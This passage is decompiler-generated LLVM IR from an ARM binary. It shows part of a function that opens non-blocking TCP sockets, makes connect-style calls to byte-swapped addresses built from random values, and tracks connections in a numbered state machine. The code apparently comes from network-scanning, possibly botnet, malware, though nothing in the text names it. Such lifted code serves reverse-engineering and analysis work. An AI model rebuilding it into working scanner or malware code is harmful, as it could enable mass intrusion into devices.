  br i1 %tmp176, label %dec_label_pc_84bc, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %thread-pre-split
  store i32 %v2_8370, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_83b0 = and i32 %arg1, 536870912
  %v3_83b0 = icmp ne i32 %v2_83b0, 0
  %v5_83b0 = mul i32 %arg1, 24
  %v2_83b4 = add i32 %v5_83b0, %arg2
  %v1_83b8 = add i32 %v2_83b4, 16
  %v2_83b8 = inttoptr i32 %v1_83b8 to i32*
  br label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_9e04, %dec_label_pc_8384
  %v1_8398 = phi i32 [ %v1_9e20, %dec_label_pc_9e04 ], [ %v2_8370, %dec_label_pc_8384 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_8398 = inttoptr i32 %v1_8398 to i32*
  store i32 -1, i32* %v2_8398, align 4
  %v0_839c = load i32, i32* %r3.global-to-local, align 4
  %v1_839c = trunc i32 %v0_839c to i8
  %v2_839c = load i32, i32* @r5, align 4
  %v3_839c = add i32 %v2_839c, 4
  %v4_839c = inttoptr i32 %v3_839c to i8*
  store i8 %v1_839c, i8* %v4_839c, align 1
  %v0_83a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_83a0, i32* %r0.global-to-local, align 4
  %v2_83a4 = call i32 @function_1016c(i32 %v0_83a0, i32 %arg1)
  store i32 %v2_83a4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i1 %v3_83b0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_83b0, i32* %r3.global-to-local, align 4
  store i32 %v2_83b4, i32* @r6, align 4
  %v3_83b8 = load i32, i32* %v2_83b8, align 4
  store i32 %v3_83b8, i32* %r2.global-to-local, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 532
  store i32 %v1_83bc, i32* @lr, align 4
  store i32 %v1_83bc, i32* @r0, align 4
  %v0_83c4 = load i32, i32* @r8, align 4
  store i32 %v0_83c4, i32* %r1.global-to-local, align 4
  %v2_83c8 = add i32 %v0_83bc, 16
  %v3_83c8 = inttoptr i32 %v2_83c8 to i32*
  store i32 %v3_83b8, i32* %v3_83c8, align 4
  %v0_83cc = load i32, i32* @lr, align 4
  %v2_83d0 = inttoptr i32 %v1_83bc to i8*
  %v3_83d0 = call i32 @function_f964(i8* %v2_83d0, i32 %v0_83c4)
  store i32 %v3_83d0, i32* %r0.global-to-local, align 4
  %v0_83d4 = load i32, i32* @r5, align 4
  %v1_83d4 = add i32 %v0_83d4, 532
  %v2_83d4 = inttoptr i32 %v1_83d4 to i8*
  %v3_83d4 = load i8, i8* %v2_83d4, align 1
  %v4_83d4 = zext i8 %v3_83d4 to i32
  store i32 %v4_83d4, i32* %r3.global-to-local, align 4
  %v2_83d8 = icmp ugt i8 %v3_83d4, 46
  store i1 %v2_83d8, i1* %cpsr_c.global-to-local, align 1
  %v7_83d8 = icmp eq i8 %v3_83d4, 47
  store i1 %v7_83d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_83d8, label %dec_label_pc_8404, label %dec_label_pc_83e0

dec_label_pc_83e0:                                ; preds = %dec_label_pc_838c
  store i32 %v0_83cc, i32* %r0.global-to-local, align 4
  %v1_83e4 = inttoptr i32 %v0_83cc to i8*
  %v2_83e4 = call i32 @function_f93c(i8* %v1_83e4)
  store i32 %v2_83e4, i32* @r2, align 4
  %v0_83ec = load i32, i32* @r5, align 4
  %v1_83f0 = add i32 %v0_83ec, 533
  store i32 %v1_83f0, i32* @r0, align 4
  store i32 %v0_83cc, i32* @r1, align 4
  %v3_83f8 = call i32 @function_10b20(i32 %v1_83f0, i32 %v0_83cc, i32 %v2_83e4)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8400 = load i32, i32* @r5, align 4
  %v3_8400 = add i32 %v2_8400, 532
  %v4_8400 = inttoptr i32 %v3_8400 to i8*
  store i8 47, i8* %v4_8400, align 1
  %v0_8408.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8404

dec_label_pc_8404:                                ; preds = %dec_label_pc_838c, %dec_label_pc_83e0
  %v0_8408 = phi i32 [ %v0_83d4, %dec_label_pc_838c ], [ %v0_8408.pre, %dec_label_pc_83e0 ]
  %v0_8404 = load i32, i32* @sb, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v1_8408 = add i32 %v0_8408, 1440
  store i32 %v1_8408, i32* @r0, align 4
  %v2_840c = inttoptr i32 %v1_8408 to i8*
  %v3_840c = call i32 @function_f964(i8* %v2_840c, i32 %v0_8404)
  %v0_8410 = load i32, i32* @r5, align 4
  %v0_8414 = load i32, i32* @sb, align 4
  store i32 %v0_8414, i32* %r1.global-to-local, align 4
  %v1_8418 = add i32 %v0_8410, 1431
  store i32 %v1_8418, i32* @r0, align 4
  %v2_841c = inttoptr i32 %v1_8418 to i8*
  %v3_841c = call i32 @function_f964(i8* %v2_841c, i32 %v0_8414)
  %v0_8420 = load i32, i32* @r5, align 4
  %v1_8424 = add i32 %v0_8420, 789
  store i32 %v1_8424, i32* @r0, align 4
  %v0_8428 = load i32, i32* @sl, align 4
  store i32 %v0_8428, i32* %r1.global-to-local, align 4
  %v2_842c = inttoptr i32 %v1_8424 to i8*
  %v3_842c = call i32 @function_f964(i8* %v2_842c, i32 %v0_8428)
  store i32 %v3_842c, i32* %r0.global-to-local, align 4
  %v0_8430 = load i32, i32* @r6, align 4
  %v1_8430 = add i32 %v0_8430, 20
  %v2_8430 = inttoptr i32 %v1_8430 to i8*
  %v3_8430 = load i8, i8* %v2_8430, align 1
  %v4_8430 = zext i8 %v3_8430 to i32
  store i32 %v4_8430, i32* %r3.global-to-local, align 4
  %v2_8434 = icmp ugt i8 %v3_8430, 30
  store i1 %v2_8434, i1* %cpsr_c.global-to-local, align 1
  %v7_8434 = icmp eq i8 %v3_8430, 31
  store i1 %v7_8434, i1* %cpsr_z.global-to-local, align 1
  %v2_8438 = xor i1 %v7_8434, true
  %v3_8438 = and i1 %v2_8434, %v2_8438
  br i1 %v3_8438, label %dec_label_pc_8480, label %dec_label_pc_843c

dec_label_pc_843c:                                ; preds = %dec_label_pc_8404
  %v1_843c = add i32 %v0_8430, 16
  %v2_843c = inttoptr i32 %v1_843c to i32*
  %v3_843c = load i32, i32* %v2_843c, align 4
  store i32 %v3_843c, i32* @r4, align 4
  %v0_8440 = call i32 @function_e7dc()
  store i32 %v0_8440, i32* %r0.global-to-local, align 4
  %v0_8444 = load i32, i32* @r4, align 4
  %v1_8444 = and i32 %v0_8444, 16711680
  store i32 %v1_8444, i32* %r1.global-to-local, align 4
  %v3_8448 = udiv i32 %v0_8444, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_844c = udiv i32 %v1_8444, 256
  %v5_844c = or i32 %v4_844c, %v3_8448
  store i32 %v5_844c, i32* %r2.global-to-local, align 4
  %v1_8450 = and i32 %v0_8444, 65280
  store i32 %v1_8450, i32* %r3.global-to-local, align 4
  %v0_8454 = load i32, i32* @r6, align 4
  %v1_8454 = add i32 %v0_8454, 20
  %v2_8454 = inttoptr i32 %v1_8454 to i8*
  %v3_8454 = load i8, i8* %v2_8454, align 1
  %v4_8454 = zext i8 %v3_8454 to i32
  %v5_845c = call i32 @llvm.bswap.i32(i32 %v0_8444)
  %v7_8460 = lshr i32 %v0_8440, %v4_8454
  %v8_8460 = add i32 %v7_8460, %v5_845c
  store i32 %v8_8460, i32* %r2.global-to-local, align 4
  %v1_8464 = and i32 %v8_8460, 16711680
  store i32 %v1_8464, i32* %r0.global-to-local, align 4
  %v1_8470 = and i32 %v8_8460, 65280
  store i32 %v1_8470, i32* %r1.global-to-local, align 4
  %v2_8478 = and i32 %v8_8460, 256
  %v3_8478 = icmp ne i32 %v2_8478, 0
  store i1 %v3_8478, i1* %cpsr_c.global-to-local, align 1
  %v5_8478 = call i32 @llvm.bswap.i32(i32 %v8_8460)
  store i32 %v5_8478, i32* %r3.global-to-local, align 4
  %v1_847c = load i32, i32* @r5, align 4
  %v2_847c = add i32 %v1_847c, 16
  %v3_847c = inttoptr i32 %v2_847c to i32*
  store i32 %v5_8478, i32* %v3_847c, align 4
  br label %dec_label_pc_8480

dec_label_pc_8480:                                ; preds = %dec_label_pc_8404, %dec_label_pc_843c
  %v0_8480 = call i32 @function_e7dc()
  %v3_848c = udiv i32 %v0_8480, 5
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  store i32 %v3_848c, i32* %r3.global-to-local, align 4
  %v2_8498 = sub i32 %v0_8480, %v3_848c
  store i32 %v2_8498, i32* %r0.global-to-local, align 4
  %v7_849c = icmp eq i32 %v2_8498, 4
  store i1 %v7_849c, i1* %cpsr_z.global-to-local, align 1
  %v5_84a0 = and i32 %v2_8498, 1073741824
  %v6_84a0 = icmp ne i32 %v5_84a0, 0
  store i1 %v6_84a0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_8498, label %dec_label_pc_9e04 [
    i32 0, label %dec_label_pc_9ec8
    i32 1, label %dec_label_pc_9e9c
    i32 2, label %dec_label_pc_9ef4
    i32 3, label %dec_label_pc_9ddc
    i32 4, label %dec_label_pc_9e5c
  ]

dec_label_pc_84bc:                                ; preds = %thread-pre-split
  %v0_84cc = load i32, i32* @r7, align 4
  %v1_84cc = and i32 %v0_84cc, 128
  %v2_84cc = icmp ne i32 %v1_84cc, 0
  store i1 %v2_84cc, i1* %cpsr_c.global-to-local, align 1
  %v3_84cc = udiv i32 %v0_84cc, 256
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v1_84d0 = add i32 %v2_8370, 1452
  store i32 %v1_84d0, i32* %r1.global-to-local, align 4
  %v2_84d4 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_84d4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_84ec.preheader

dec_label_pc_84ec.preheader:                      ; preds = %dec_label_pc_84bc, %dec_label_pc_9e28
  %v0_9e38.sink = phi i32 [ %v0_9e38, %dec_label_pc_9e28 ], [ %v0_84cc, %dec_label_pc_84bc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e38, %dec_label_pc_9e28 ], [ %v3_84cc, %dec_label_pc_84bc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e40, %dec_label_pc_9e28 ], [ %v2_84d4, %dec_label_pc_84bc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e3c, %dec_label_pc_9e28 ], [ %v1_84d0, %dec_label_pc_84bc ]
  %v1_9e44 = urem i32 %v0_9e38.sink, 256
  store i32 %v1_9e44, i32* @r7, align 4
  %v2_8654 = ptrtoint i32* %stack_var_-152 to i32
  %v2_866c = ptrtoint i32* %stack_var_-44 to i32
  %v2_86b4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_86d0 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88b0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c0c = icmp eq i32 %v6_81bc, 0
  %v1_8b08 = inttoptr i32 %v6_81bc to i8*
  %v2_8738 = ptrtoint i32* %stack_var_-60 to i32
  %v2_873c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8740 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8820 = ptrtoint i32* %stack_var_-48 to i32
  %v2_882c = ptrtoint i32* %stack_var_-52 to i32
  %v4_868c = mul nuw nsw i32 %v1_9e44, 256
  %v5_868c = or i32 %v4_868c, %stack_var_-20864.0.ph
  br label %dec_label_pc_84ec

dec_label_pc_84ec:                                ; preds = %dec_label_pc_8718, %dec_label_pc_854c, %dec_label_pc_8710, %dec_label_pc_87ac, %dec_label_pc_84ec.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_84f0 = call i32 @function_10254(i32* null)
  store i32 %v2_84f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_851c225 = load i32, i32* @sp, align 4
  %v3_851c226 = add i32 %v2_851c225, 20688
  %v4_851c227 = inttoptr i32 %v3_851c226 to i32*
  store i32 0, i32* %v4_851c227, align 4
  br label %dec_label_pc_8508.dec_label_pc_8508_crit_edge

dec_label_pc_8508.dec_label_pc_8508_crit_edge:    ; preds = %dec_label_pc_84ec, %dec_label_pc_8508.dec_label_pc_8508_crit_edge
  %v0_8508.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_850c = add i32 %v0_8508.pre, 4
  store i32 %v1_850c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8514 = add i32 %v0_8508.pre, 20684
  store i32 %v1_8514, i32* @lr, align 4
  %v7_8518 = icmp eq i32 %v1_850c, 128
  %v2_851c = load i32, i32* @sp, align 4
  %v3_851c = add i32 %v2_851c, %v1_8514
  %v4_851c = inttoptr i32 %v3_851c to i32*
  store i32 0, i32* %v4_851c, align 4
  br i1 %v7_8518, label %dec_label_pc_8524, label %dec_label_pc_8508.dec_label_pc_8508_crit_edge

dec_label_pc_8524:                                ; preds = %dec_label_pc_8508.dec_label_pc_8508_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v0_8528 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8528, i32* %stack_var_-332, align 4
  %v0_852c = load i32, i32* %r3.global-to-local, align 4
  %v1_8534228 = add i32 %v0_852c, -120
  store i32 %v1_8534228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_853c229 = add i32 %v0_852c, 20432
  store i32 %v1_853c229, i32* %r2.global-to-local, align 4
  %v7_8540230 = icmp eq i32 %v1_8534228, 128
  %v2_8544231 = load i32, i32* @sp, align 4
  %v3_8544232 = add i32 %v2_8544231, %v1_853c229
  %v4_8544233 = inttoptr i32 %v3_8544232 to i32*
  store i32 0, i32* %v4_8544233, align 4
  br i1 %v7_8540230, label %dec_label_pc_854c, label %dec_label_pc_8530.dec_label_pc_8530_crit_edge

dec_label_pc_8530.dec_label_pc_8530_crit_edge:    ; preds = %dec_label_pc_8524, %dec_label_pc_8530.dec_label_pc_8530_crit_edge
  %v0_8530.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8534 = add i32 %v0_8530.pre, 4
  store i32 %v1_8534, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_853c = add i32 %v0_8530.pre, 20556
  store i32 %v1_853c, i32* %r2.global-to-local, align 4
  %v7_8540 = icmp eq i32 %v1_8534, 128
  %v2_8544 = load i32, i32* @sp, align 4
  %v3_8544 = add i32 %v2_8544, %v1_853c
  %v4_8544 = inttoptr i32 %v3_8544 to i32*
  store i32 0, i32* %v4_8544, align 4
  br i1 %v7_8540, label %dec_label_pc_854c, label %dec_label_pc_8530.dec_label_pc_8530_crit_edge

dec_label_pc_854c:                                ; preds = %dec_label_pc_8530.dec_label_pc_8530_crit_edge, %dec_label_pc_8524
  store i32 %v0_835c, i32* %r3.global-to-local, align 4
  %v1_8550 = load i32, i32* %r0.global-to-local, align 4
  %v3_8550 = icmp uge i32 %v0_835c, %v1_8550
  store i1 %v3_8550, i1* %cpsr_c.global-to-local, align 1
  %v9_8550 = icmp eq i32 %v0_835c, %v1_8550
  store i1 %v9_8550, i1* %cpsr_z.global-to-local, align 1
  %v7_8554 = icmp sgt i32 %v0_835c, %v1_8550
  br i1 %v7_8554, label %dec_label_pc_8558, label %dec_label_pc_84ec

dec_label_pc_8558:                                ; preds = %dec_label_pc_854c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8550, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8550, i32* @r7, align 4
  br label %dec_label_pc_85cc

dec_label_pc_856c:                                ; preds = %dec_label_pc_85e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_856c = icmp eq i8 %v3_85cc, 2
  store i1 %v7_856c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_856c, label %dec_label_pc_8cac, label %dec_label_pc_8574

dec_label_pc_8574:                                ; preds = %dec_label_pc_856c
  %v2_8574 = icmp ugt i8 %v3_85cc, 3
  store i1 %v2_8574, i1* %cpsr_c.global-to-local, align 1
  %v7_8574 = icmp eq i8 %v3_85cc, 4
  store i1 %v7_8574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8574, label %dec_label_pc_887c, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_8574
  %v1_857c = add nsw i32 %v4_85cc, -6
  %v2_857c = icmp ugt i8 %v3_85cc, 5
  store i1 %v2_857c, i1* %cpsr_c.global-to-local, align 1
  %v7_857c = icmp eq i8 %v3_85cc, 6
  store i1 %v7_857c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_857c, label %dec_label_pc_8cdc, label %dec_label_pc_8584

dec_label_pc_8584:                                ; preds = %dec_label_pc_857c
  %v2_8584 = icmp ugt i8 %v3_85cc, 6
  store i1 %v2_8584, i1* %cpsr_c.global-to-local, align 1
  %v7_8584 = icmp eq i8 %v3_85cc, 7
  store i1 %v7_8584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8584, label %dec_label_pc_8f18, label %dec_label_pc_858c

dec_label_pc_858c:                                ; preds = %dec_label_pc_8584
  %v2_858c = icmp ugt i8 %v3_85cc, 9
  store i1 %v2_858c, i1* %cpsr_c.global-to-local, align 1
  %v7_858c = icmp eq i8 %v3_85cc, 10
  store i1 %v7_858c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_858c, label %dec_label_pc_8f6c, label %dec_label_pc_8594

dec_label_pc_8594:                                ; preds = %dec_label_pc_858c
  %v1_8594 = add nsw i32 %v4_85cc, -11
  %v2_8594 = icmp ugt i8 %v3_85cc, 10
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  %v7_8594 = icmp eq i8 %v3_85cc, 11
  store i1 %v7_8594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8594, label %dec_label_pc_952c, label %dec_label_pc_859c

dec_label_pc_859c:                                ; preds = %dec_label_pc_8cac, %dec_label_pc_8594
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_85cc, align 1
  %v0_85a4 = load i32, i32* @r6, align 4
  %v1_85a4 = add i32 %v0_85a4, -1452
  %v2_85a4 = inttoptr i32 %v1_85a4 to i32*
  %v3_85a4 = load i32, i32* %v2_85a4, align 4
  store i32 %v3_85a4, i32* %r0.global-to-local, align 4
  %v1_85a8 = call i32 @function_10608(i32 %v3_85a4)
  store i32 %v1_85a8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85b0 = load i32, i32* @r6, align 4
  %v2_85b0 = add i32 %v1_85b0, -1452
  %v3_85b0 = inttoptr i32 %v2_85b0 to i32*
  store i32 -1, i32* %v3_85b0, align 4
  br label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_8f6c, %dec_label_pc_8f18, %dec_label_pc_8cdc, %dec_label_pc_86d8, %dec_label_pc_85e8, %dec_label_pc_952c, %bb180, %dec_label_pc_859c
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_85b8 = load i32, i32* @r7, align 4
  %v1_85b8 = add i32 %v0_85b8, 1
  store i32 %v1_85b8, i32* @r7, align 4
  %v0_85bc = load i32, i32* @r6, align 4
  %v3_85c0 = icmp uge i32 %v1_85b8, %v0_835c
  store i1 %v3_85c0, i1* %cpsr_c.global-to-local, align 1
  %v9_85c0 = icmp eq i32 %v1_85b8, %v0_835c
  store i1 %v9_85c0, i1* %cpsr_z.global-to-local, align 1
  %v1_85c4 = add i32 %v0_85bc, 3140
  store i32 %v1_85c4, i32* @r6, align 4
  br i1 %v9_85c0, label %dec_label_pc_85b4.dec_label_pc_8710_crit_edge, label %dec_label_pc_85cc

dec_label_pc_85b4.dec_label_pc_8710_crit_edge:    ; preds = %dec_label_pc_85b4
  %v0_8710.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8710

dec_label_pc_85cc:                                ; preds = %dec_label_pc_86f8, %dec_label_pc_85b4, %dec_label_pc_8558
  %v3_8870 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8558 ], [ %v1_85c4, %dec_label_pc_85b4 ], [ %v1_8708, %dec_label_pc_86f8 ]
  %v1_85cc = add i32 %v3_8870, -1448
  %v2_85cc = inttoptr i32 %v1_85cc to i8*
  %v3_85cc = load i8, i8* %v2_85cc, align 1
  %v4_85cc = zext i8 %v3_85cc to i32
  store i32 %v4_85cc, i32* @r3, align 4
  %v2_85d4 = icmp ne i8 %v3_85cc, 0
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v6_85d4 = icmp eq i8 %v3_85cc, 0
  %v7_85d4 = icmp eq i8 %v3_85cc, 1
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  %v1_85d8 = add i32 %v3_8870, -1452
  store i32 %v1_85d8, i32* @r5, align 4
  br i1 %v7_85d4, label %dec_label_pc_8864, label %dec_label_pc_85e0

dec_label_pc_85e0:                                ; preds = %dec_label_pc_85cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_85d4, label %dec_label_pc_85e8, label %dec_label_pc_856c

dec_label_pc_85e8:                                ; preds = %.thread19.dec_label_pc_85e8_crit_edge, %dec_label_pc_85e0
  %v0_85e8 = phi i32 [ %v0_85e8.pre, %.thread19.dec_label_pc_85e8_crit_edge ], [ %v3_8870, %dec_label_pc_85e0 ]
  %v1_85e8 = add i32 %v0_85e8, -1452
  %v2_85e8 = inttoptr i32 %v1_85e8 to i32*
  %v3_85e8 = load i32, i32* %v2_85e8, align 4
  store i32 %v3_85e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v2_85f4 = icmp eq i32 %v3_85e8, -1
  store i1 %v2_85f4, i1* %cpsr_c.global-to-local, align 1
  %v7_85f4 = icmp eq i32 %v3_85e8, -1
  store i1 %v7_85f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34316, i32* @lr, align 4
  %v1_8608 = xor i1 %v7_85f4, true
  call void @__pseudo_cond_branch(i1 %v1_8608, i32 ptrtoint (i32* @global_var_10608.22 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8614 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8614, i32* %r2.global-to-local, align 4
  %v3_8618 = call i32 @function_10df0(i32 2, i32 1, i32 %v0_8614)
  store i32 %v3_8618, i32* %r0.global-to-local, align 4
  %v2_861c = icmp eq i32 %v3_8618, -1
  store i1 %v2_861c, i1* %cpsr_c.global-to-local, align 1
  %v7_861c = icmp eq i32 %v3_8618, -1
  store i1 %v7_861c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8618, i32* @r4, align 4
  %v1_8624 = load i32, i32* @r6, align 4
  %v2_8624 = add i32 %v1_8624, -1452
  %v3_8624 = inttoptr i32 %v2_8624 to i32*
  store i32 %v3_8618, i32* %v3_8624, align 4
  br i1 %v7_861c, label %dec_label_pc_85b4, label %dec_label_pc_862c

dec_label_pc_862c:                                ; preds = %dec_label_pc_85e8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8630 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_8630, i32* %r2.global-to-local, align 4
  %v2_8634 = call i32 @function_1043c(i32 %v3_8618, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_863c = or i32 %v2_8634, 2048
  store i32 %v1_863c, i32* %r2.global-to-local, align 4
  %v0_8640 = load i32, i32* @r4, align 4
  store i32 %v0_8640, i32* %r0.global-to-local, align 4
  %v2_8644 = call i32 @function_1043c(i32 %v0_8640, i32 4)
  store i32 %v2_8644, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_8654, i32* %r3.global-to-local, align 4
  %v0_8658 = load i32, i32* @r6, align 4
  %v1_8658 = add i32 %v0_8658, -1452
  %v2_8658 = inttoptr i32 %v1_8658 to i32*
  %v3_8658 = load i32, i32* %v2_8658, align 4
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v0_865c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_865c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_866c, i32* %r3.global-to-local, align 4
  %v5_8674 = call i32 @function_10dac(i32 %v3_8658, i32 %v0_865c, i32 8, i32 %v2_866c, i32 4)
  store i32 %v5_8674, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e44, i32* %r2.global-to-local, align 4
  %v0_8680 = load i32, i32* @r6, align 4
  %v1_8680 = add i32 %v0_8680, -1436
  %v2_8680 = inttoptr i32 %v1_8680 to i32*
  %v3_8680 = load i32, i32* %v2_8680, align 4
  store i32 %v3_8680, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_868c, i32* %r3.global-to-local, align 4
  %v1_8690 = add i32 %v0_8680, -1452
  %v2_8690 = inttoptr i32 %v1_8690 to i32*
  %v3_8690 = load i32, i32* %v2_8690, align 4
  store i32 %v3_8690, i32* %r0.global-to-local, align 4
  %v3_86a0 = add i32 %v0_8680, -1448
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 2, i8* %v4_86a0, align 1
  store i32 %v2_84f0, i32* %r3.global-to-local, align 4
  %v0_86ac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ac, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86b4, i32* %r1.global-to-local, align 4
  %v1_86b8 = load i32, i32* @r6, align 4
  %v2_86b8 = add i32 %v1_86b8, -1444
  %v3_86b8 = inttoptr i32 %v2_86b8 to i32*
  store i32 %v2_84f0, i32* %v3_86b8, align 4
  %v3_86bc = call i32 @function_10bd8(i32 %v3_8690, i32 %v2_86b4, i32 16)
  store i32 %v3_86bc, i32* %r0.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1452
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* %ip.global-to-local, align 4
  %v3_86c8 = udiv i32 %v3_86c0, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_86cc = mul nuw nsw i32 %v3_86c8, 4
  store i32 %v3_86cc, i32* %r2.global-to-local, align 4
  store i32 %v2_86d0, i32* @lr, align 4
  br label %dec_label_pc_86d8

dec_label_pc_86d8:                                ; preds = %dec_label_pc_8cc0, %dec_label_pc_862c
  %v0_86e8 = phi i32 [ %v3_86c0, %dec_label_pc_862c ], [ %v3_8cc0, %dec_label_pc_8cc0 ]
  %v3_86cc.pn = phi i32 [ %v3_86cc, %dec_label_pc_862c ], [ %v3_8ccc, %dec_label_pc_8cc0 ]
  %storemerge = add i32 %v3_86cc.pn, %v2_86d0
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_86d8 = add i32 %storemerge, -292
  %v2_86d8 = inttoptr i32 %v1_86d8 to i32*
  %v3_86d8 = load i32, i32* %v2_86d8, align 4
  %v1_86dc = urem i32 %v0_86e8, 32
  store i32 %v1_86dc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_86e4 = shl i32 1, %v1_86dc
  %v8_86e4 = or i32 %v3_86d8, %v7_86e4
  store i32 %v8_86e4, i32* %r1.global-to-local, align 4
  %v1_86e8 = load i32, i32* @r8, align 4
  %v2_86e8 = sub i32 %v0_86e8, %v1_86e8
  %v3_86e8 = icmp uge i32 %v0_86e8, %v1_86e8
  store i1 %v3_86e8, i1* %cpsr_c.global-to-local, align 1
  %v4_86e8 = xor i32 %v1_86e8, %v0_86e8
  %v5_86e8 = xor i32 %v2_86e8, %v0_86e8
  %v6_86e8 = and i32 %v5_86e8, %v4_86e8
  %v7_86e8 = icmp slt i32 %v6_86e8, 0
  %v8_86e8 = icmp slt i32 %v2_86e8, 0
  %v9_86e8 = icmp eq i32 %v0_86e8, %v1_86e8
  store i1 %v9_86e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_86e4, i32* %v2_86d8, align 4
  %v3_86f0 = xor i1 %v8_86e8, %v7_86e8
  %v4_86f0 = or i1 %v9_86e8, %v3_86f0
  br i1 %v4_86f0, label %dec_label_pc_85b4, label %dec_label_pc_86f4

dec_label_pc_86f4:                                ; preds = %dec_label_pc_86d8
  %v0_86f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_86f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_86f4 = add i32 %v1_86f4, %v0_86f4
